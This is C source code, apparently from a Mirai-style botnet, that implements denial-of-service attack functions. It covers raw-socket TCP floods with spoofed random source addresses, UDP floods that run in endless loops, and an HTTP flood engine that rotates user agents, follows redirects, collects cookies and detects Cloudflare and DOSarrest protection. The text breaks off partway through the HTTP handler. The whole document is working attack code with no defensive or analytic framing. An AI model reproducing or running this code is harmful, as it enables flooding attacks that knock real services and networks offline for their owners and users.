#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"
#include "killer.h"

static ipv4_t get_dns_resolver(void);

void attack_method_tcp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}

void attack_method_udpplain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 4096);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_method_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}

void attack_method_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_http_state *http_table = NULL;
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    char generic_memes[10241] = {0};

    if (domain == NULL || path == NULL)
        return;

    if (util_strlen(path) > HTTP_PATH_MAX - 1)
        return;

    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;

    if (util_strlen(method) > 9)
        return;

    // BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?
    // yes it would segfault but we only update the values if they are not already uppercase.
    // if the method is lowercase and its passed from the CNC we can update that memory no problem
    for (ii = 0; ii < util_strlen(method); ii++)
        if (method[ii] >= 'a' && method[ii] <= 'z')
            method[ii] -= 32;

    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;

    // unlock frequently used strings
    table_unlock_val(TABLE_ATK_SET_COOKIE);
    table_unlock_val(TABLE_ATK_REFRESH_HDR);
    table_unlock_val(TABLE_ATK_LOCATION_HDR);
    table_unlock_val(TABLE_ATK_SET_COOKIE_HDR);
    table_unlock_val(TABLE_ATK_CONTENT_LENGTH_HDR);
    table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
    table_unlock_val(TABLE_ATK_CHUNKED);
    table_unlock_val(TABLE_ATK_KEEP_ALIVE_HDR);
    table_unlock_val(TABLE_ATK_CONNECTION_HDR);
    table_unlock_val(TABLE_ATK_DOSARREST);
    table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX);

    http_table = calloc(sockets, sizeof(struct attack_http_state));

    for (i = 0; i < sockets; i++)
    {
        http_table[i].state = HTTP_CONN_INIT;
        http_table[i].fd = -1;
        http_table[i].dst_addr = targs[i % targs_len].addr;

        util_strcpy(http_table[i].path, path);

        if (http_table[i].path[0] != '/')
        {
            memmove(http_table[i].path + 1, http_table[i].path, util_strlen(http_table[i].path));
            http_table[i].path[0] = '/';
        }

        util_strcpy(http_table[i].orig_method, method);
        util_strcpy(http_table[i].method, method);

        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 5)
        {
            case 0:
                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
                table_lock_val(TABLE_HTTP_FIVE);
                break;
        }

        util_strcpy(http_table[i].path, path);
    }

    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        int mfd = 0, nfds;
        struct timeval tim;
        struct attack_http_state *conn;
        uint32_t fake_time = time(NULL);

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                if (conn->keepalive)
                    conn->state = HTTP_CONN_SEND;
                else
                    conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(dport);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
#ifdef DEBUG
                printf("[http flood] fd%d started connect\n", conn->fd);
#endif

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND)
            {
                conn->content_length = -1; 
                conn->protection_type = 0;
                util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
                conn->rdbuf_pos = 0;

#ifdef DEBUG
                //printf("[http flood] Sending http request\n");
#endif

                char buf[10240];
                util_zero(buf, 10240);

                table_unlock_val(TABLE_ATK_HTTP);
                table_unlock_val(TABLE_ATK_USERAGENT);
                table_unlock_val(TABLE_ATK_HOST);

                util_strcpy(buf + util_strlen(buf), conn->method);
                util_strcpy(buf + util_strlen(buf), " ");
                util_strcpy(buf + util_strlen(buf), conn->path);
                util_strcpy(buf + util_strlen(buf), " ");
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_HTTP, NULL));
                util_strcpy(buf + util_strlen(buf), "\r\n");
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_USERAGENT, NULL)); 
                util_strcpy(buf + util_strlen(buf), " ");
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), "\r\n");
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_HOST, NULL));
                util_strcpy(buf + util_strlen(buf), " ");
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_lock_val(TABLE_ATK_HTTP);
                table_lock_val(TABLE_ATK_USERAGENT);
                table_lock_val(TABLE_ATK_HOST);

                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                {
                    table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                    table_lock_val(TABLE_ATK_CONTENT_TYPE);

                    util_strcpy(buf + util_strlen(buf), "\r\n");
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                    util_strcpy(buf + util_strlen(buf), " ");
                    util_itoa(util_strlen(postdata), 10, buf + util_strlen(buf));
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                if (conn->num_cookies > 0)
                {
                    table_unlock_val(TABLE_ATK_COOKIE);
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_COOKIE, NULL));
                    table_lock_val(TABLE_ATK_COOKIE);
                    util_strcpy(buf + util_strlen(buf), " ");
                    for (ii = 0; ii < conn->num_cookies; ii++)
                    {
                        util_strcpy(buf + util_strlen(buf), conn->cookies[ii]);
                        util_strcpy(buf + util_strlen(buf), "; ");
                    }
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                    util_strcpy(buf + util_strlen(buf), postdata);

                if (!util_strcmp(conn->method, conn->orig_method))
                    util_strcpy(conn->method, conn->orig_method);

#ifdef DEBUG
                if (sockets == 1)
                {
                    printf("sending buf: \"%s\"\n", buf);
                }
#endif

                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                conn->state = HTTP_CONN_RECV_HEADER;
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_HEADER)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_BODY)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_QUEUE_RESTART)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CLOSED)
            {
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
            else
            {
                // NEW STATE WHO DIS
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
#ifdef DEBUG
                    printf("[http flood] FD%d connected.\n", conn->fd);
#endif
                        conn->state = HTTP_CONN_SEND;
                }
                else
                {
#ifdef DEBUG
                    printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = HTTP_CONN_INIT;
                    continue;
                }
            }

        if (FD_ISSET(conn->fd, &fdset_rd))
            {
                if (conn->state == HTTP_CONN_RECV_HEADER)
                {
                    int processed = 0;

                    util_zero(generic_memes, 10240);
                    if ((ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL | MSG_PEEK)) < 1)
                    {
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }


                    // we want to process a full http header (^:
                    if (util_memsearch(generic_memes, ret, "\r\n\r\n", 4) == -1 && ret < 10240)
                        continue;

                    generic_memes[util_memsearch(generic_memes, ret, "\r\n\r\n", 4)] = 0;

#ifdef DEBUG
                    if (sockets == 1)
                        printf("[http flood] headers: \"%s\"\n", generic_memes);
#endif

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_CLOUDFLARE;

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_DOSARREST, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_DOSARREST;

                    conn->keepalive = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_KEEP_ALIVE_HDR, NULL)))
                                conn->keepalive = 1;
                        }
                    }

                    conn->chunked = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_CHUNKED, NULL)))
                                conn->chunked = 1;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *len_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            conn->content_length = util_atoi(len_ptr, 10);
                        }
                    } else {
                        conn->content_length = 0;
                    }

                    processed = 0;
                    while (util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL)) != -1 && conn->num_cookies < HTTP_COOKIE_MAX)
                    {
                        int offset = util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL));
                        if (generic_memes[processed + offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *cookie_ptr = &(generic_memes[processed + offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;

                            if (util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) > 0)
                                nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) - 1;

                            generic_memes[processed + offset + nl_off] = 0;

                            for (ii = 0; ii < util_strlen(cookie_ptr); ii++)
                                if (cookie_ptr[ii] == '=')
                                    break;

                            if (cookie_ptr[ii] == '=')
                            {
                                int equal_off = ii, cookie_exists = FALSE;

                                for (ii = 0; ii < conn->num_cookies; ii++)
                                    if (util_strncmp(cookie_ptr, conn->cookies[ii], equal_off))
                                    {
                                        cookie_exists = TRUE;
                                        break;
                                    }

                                if (!cookie_exists)
                                {
                                    if (util_strlen(cookie_ptr) < HTTP_COOKIE_LEN_MAX)
                                    {
                                        util_strcpy(conn->cookies[conn->num_cookies], cookie_ptr);
                                        conn->num_cookies++;
                                    }
                                }
                            }
                        }

                        processed += offset;
                    }

                    // this will still work as previous handlers will only add in null chars or similar
                    // and we specify the size of the string to stristr
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            table_unlock_val(TABLE_ATK_SEARCHHTTP);
                            if (util_memsearch(loc_ptr, nl_off, table_retrieve_val(TABLE_ATK_SEARCHHTTP, NULL), 4) == 4)
                            {
                                //this is an absolute url, domain name change maybe?
                                ii = 7;
                                //http(s)
                                if (loc_ptr[4] == 's')
                                    ii++;

                                memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                ii = 0;
                                while (loc_ptr[ii] != 0)
                                {
                                    if (loc_ptr[ii] == '/')
                                    {
                                        loc_ptr[ii] = 0;
                                        break;
                                    }
                                    ii++;
                                }
                                table_lock_val(TABLE_ATK_SEARCHHTTP);

                                // domain: loc_ptr;
                                // path: &(loc_ptr[ii + 1]);

                                if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                    util_strcpy(conn->domain, loc_ptr);

                                if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                {
                                    util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                    if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                        util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                }
                            }
                            else if (loc_ptr[0] == '/')
                            {
                                //handle relative url
                                util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                if (util_strlen(&(loc_ptr[ii + 1])) > 0 && util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                            }

                            conn->state = HTTP_CONN_RESTART;
                            continue;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            ii = 0;

                            while (loc_ptr[ii] != 0 && loc_ptr[ii] >= '0' && loc_ptr[ii] <= '9')
                                ii++;

                            if (loc_ptr[ii] != 0)
                            {
                                int wait_time = 0;
                                loc_ptr[ii] = 0;
                                ii++;

                                if (loc_ptr[ii] == ' ')
                                    ii++;

                                table_unlock_val(TABLE_ATK_URL);
                                if (util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), table_retrieve_val(TABLE_ATK_URL, NULL)) != -1)
                                    ii += util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), table_retrieve_val(TABLE_ATK_URL, NULL));

                                table_lock_val(TABLE_ATK_URL);

                                if (loc_ptr[ii] == '"')
                                {
                                    ii++;

                                    //yes its ugly, but i dont care
                                    if ((&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] == '"')
                                        (&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] = 0;
                                }

                                wait_time = util_atoi(loc_ptr, 10);

                                //YOLO LOL
                                while (wait_time > 0 && wait_time < 10 && fake_time + wait_time > time(NULL))
                                    sleep(1);

                                loc_ptr = &(loc_ptr[ii]);


                                table_unlock_val(TABLE_ATK_HTTP);
                                if (util_stristr(loc_ptr, util_strlen(loc_ptr), table_retrieve_val(TABLE_ATK_HTTP, NULL)) == 4)
                                {
                                    //this is an absolute url, domain name change maybe?
                                    ii = 7;
                                    //http(s)
                                    if (loc_ptr[4] == 's')
                                        ii++;

                                    memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                    ii = 0;
                                    while (loc_ptr[ii] != 0)
                                    {
                                        if (loc_ptr[ii] == '/')
                                        {
                                            loc_ptr[ii] = 0;
                                            break;
                                        }
                                        ii++;
                                    }
                                    table_lock_val(TABLE_ATK_HTTP);

                                    // domain: loc_ptr;
                                    // path: &(loc_ptr[ii + 1]);

                                    if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
